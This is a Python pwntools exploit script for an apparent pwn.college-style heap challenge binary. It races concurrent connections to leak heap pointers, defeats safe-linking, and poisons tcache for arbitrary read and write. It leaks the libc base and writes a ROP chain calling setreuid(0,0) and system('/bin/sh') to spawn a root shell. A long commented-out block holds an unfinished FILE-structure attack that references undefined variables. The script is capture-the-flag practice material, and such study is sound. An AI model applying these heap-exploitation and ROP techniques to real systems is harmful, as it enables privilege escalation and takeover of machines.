# idea: get binary addr -> overwrite FS and saved RIP -> fclose triggers binary_base + (ret gadget in libc) -> ROP

from pwn import *
import os
import sys
import time

context.arch = 'amd64'
context.log_level = 'error'
libc = ELF("/challenge/lib/libc.so.6")

def mangle(target:int, ptr:int, page_offset=0)->int:
    return target ^ ((ptr >> 12) + page_offset)

def demangle(raw:int, page_offset=0)->int:
    pos = (raw >> 12) + page_offset
    m = pos ^ raw
    return m >> 24 ^ m

def warmup_heap(r):
    r.sendline(b'malloc 8')
    r.sendline(b'malloc 9')
    r.sendline(b'malloc 10')
    r.sendline(b'free 10')
    r.sendline(b'free 9')
    r.sendline(b'free 8')

def get_heap_leak(r1, r2):
    r1.clean()
    r2.clean()
    pid = os.fork()
    if pid == 0:
        # child
        for _ in range(10000):
            r1.sendline(b'malloc 0 scanf 0 AAAAAAAABBBBBBBB free 0')
        sys.exit(0)
    for _ in range(10000):
        r2.sendline(b'printf 0')
    os.wait()
    raw = r2.clean(1)
    for line in raw.splitlines():
        if b'NONE' not in line and b'\x7f' in line:
            print(line)
            leak = line.split(b'MESSAGE: ')[1]
            print(f'mangled leak = {hex(unpack(leak, "all"))}')
            return demangle(unpack(leak, 'all'), page_offset=-1)


idx = 1

def controlled_allocation(r1, r2, addr):
    global idx
    r1.clean()
    r2.clean()

    r1.sendline(f"malloc {idx} malloc {idx+1} free {idx+1}")
    while True:
        pid = os.fork()
        if pid == 0:
            # child
            r1.sendline(f"free {idx}")
            sys.exit(0)
        r2.send((f'scanf {idx} '.encode('utf-8') + p64(addr) + b'\n')*2000)
        os.wait()

        time.sleep(0.1)
        # if we successfully overwrote *next of the top chunk in the bin
        r1.sendline(f'malloc {idx} printf {idx}')
        r1.recvuntil(b'MESSAGE: ')
        result = r1.recvline()[:-1]
        print(f'result = {result}; expected = {p64(addr)}')
        if unpack(result, 'all') == addr:
            break

    r1.sendline(f'malloc {idx+1}')
    r1.clean()
    idx += 2

def arb_read(r1, r2, addr):
    # addr is already mangled
    # 0x20 is bad byte for scanf
    assert 0x20 not in set(p64(addr))

    controlled_allocation(r1, r2, addr)
    r1.sendline(f'printf {idx-1}')
    r1.recvuntil(b'MESSAGE: ')
    result = r1.recvline()[:-1]

    return result

def arb_write(r1, r2, addr, buf):
    # addr is already mangled
    # 0x20 is bad byte for scanf
    assert 0x20 not in set(p64(addr))

    controlled_allocation(r1, r2, addr)
    r1.sendline(f'scanf {idx-1} '.encode('utf-8') + buf)

#b *challenge+1022
#p = gdb.debug("/challenge/babyprime_level8.0", gdbscript=
#"""
#continue
#""")
p = process("/challenge/babyprime_level8.0")
time.sleep(1)

r1 = remote("127.0.0.1", 1337)
r2 = remote("127.0.0.1", 1337)
r3 = remote("127.0.0.1", 1337)
r4 = remote("127.0.0.1", 1337)

warmup_heap(r1)
warmup_heap(r2)
warmup_heap(r3)
warmup_heap(r4)

heap_leak = get_heap_leak(r1, r2)
print(f'heap_leak = {hex(heap_leak)}')

_IO_wfile_jumps_loc = heap_leak - 0x600
_IO_wfile_jumps = unpack(arb_read(r1, r2, mangle(_IO_wfile_jumps_loc, heap_leak, page_offset=-1)), 'all')
libc_base = _IO_wfile_jumps - libc.sym['_IO_wfile_jumps'] # 0x2160c0
libc.address = libc_base
print(f'libc_Base = {hex(libc_base)}')
saved_rip = libc_base - 0x4660
print(f'saved_rip = {hex(saved_rip)}') # not safelink-aligned address
dummy_rbp = saved_rip - 0x8 + 0x10

#payload = b'\x00'*0x10 + p64(dummy_rbp)

rop = ROP(libc, badchars=b"\x09\x0a\x0b\x0c\x0d\x0e\x20")
bin_sh = next(libc.search(b'/bin/sh'))
rop.setreuid(0, 0)
rop.system(bin_sh)

#rop.call("exit", [42])

#final_payload = rop.chain()
heap_leak_2 = get_heap_leak(r3, r4)
'''
print(f'heap_leak_2 = {hex(heap_leak_2)}')
fp_loc = (heap_leak_2>>16<<16) + 0x21000 + 0x3fdf000 + 0xb70
print(f'fp_loc = {hex(fp_loc)}')

# construct FILE_plus structure
_wide_vtable_offset = 0xe0
doallocbuf_call_offset = 0x68

# fake wide_data vtable
# point to the memory right below itself
#ret_gadget = libc.sym['fts_open'] + 1063

#_wide_data_vtable_loc = fp_loc + _wide_vtable_offset + 0x8
#_wide_vtable = b"\x00" * doallocbuf_call_offset + p64(ret_gadget)
#_wide_data_vtable_loc = fp_loc + 0xf0 #the start of _wide_data
#_wide_vtable = b"a" * doallocbuf_call_offset + p64(ret_gadget)
#_wide_data = _wide_vtable + b'a'*(_wide_vtable_offset - len(_wide_vtable)) + p64(_wide_data_vtable_loc)

rdi = bin_sh
fs = FileStructure()
#fs.flags = 0xfbad248b
fs.vtable = libc.sym['_IO_str_overflow'] - 0x10 # fclose calling vtable + 0x10
fs._lock = fp_loc - 0x10 # writable null
fs._IO_buf_base = 0
fs._IO_buf_end = (rdi-100)//2
fs._IO_write_ptr = (rdi-100)//2
fs._IO_write_base = 0
#fs._wide_data = _wide_data_vtable_loc # wide_data vtable will be right below the FILE_plus struct

#payload = bytes(fs)
#fs_payload = p64(0x800) + p64(fp_loc - 0xb70 + 0xbf3) + p64(fp_loc - 0xb70 + 0xbf4) + p64(fp_loc - 0xb70 + 0xbf3)*5 + p64(fp_loc - 0xb70 + 0xbf4) + p64(0)*8 + p64(fp_loc - 0xb70 + 0xc50) + p64(0xffffffffffffffff) + p64(0) + p64(_wide_data_vtable_loc) + p64(0)*3 + p64(0x00000000ffffffff) + p64(0)*2 + p64(libc.sym['_IO_wfile_jumps'] + 24 - 0x10) + _wide_data

# fake wide_data vtable
# point to the memory right below itself

fs_payload = bytes(fs) + p64(libc.sym['system'])
#fs_payload = p64(0) + p64(libc.sym['_IO_wfile_jumps'] + 24 - 0x10) + p64(0)*4 + _wide_data
arb_write(r3, r4, mangle(fp_loc, heap_leak_2, page_offset=-1), fs_payload)

heap_leak_3 = get_heap_leak(r5, r6)
arb_write(r5, r6, mangle(saved_rip, heap_leak_3, page_offset=-1), final_payload)

time.sleep(1)
r1.sendline(b"quit")
'''
ret_inside_printf = libc_base - 33588840 - 0x8 # ends in 0x8, need to align with safe-link
payload = p64(ret_inside_printf) + rop.chain()
r5 = remote('127.0.0.1', 1337)
arb_write(r3, r4, mangle(ret_inside_printf, heap_leak_2, page_offset=-1), payload)

r5.sendline(b"malloc 12 scanf 12 AAAA printf 12")
print(r5.clean())

print(f'saved_rip = {hex(saved_rip)}') # not safelink-aligned address
print(f'libc_Base = {hex(libc_base)}')
print(f'heap_leak = {hex(heap_leak)}')
print(f'heap_leak_2 = {hex(heap_leak_2)}')
print(f'ret_inside_printf = {hex(ret_inside_printf)}')
#print(f"Exited: {p.poll()}")
p.interactive()
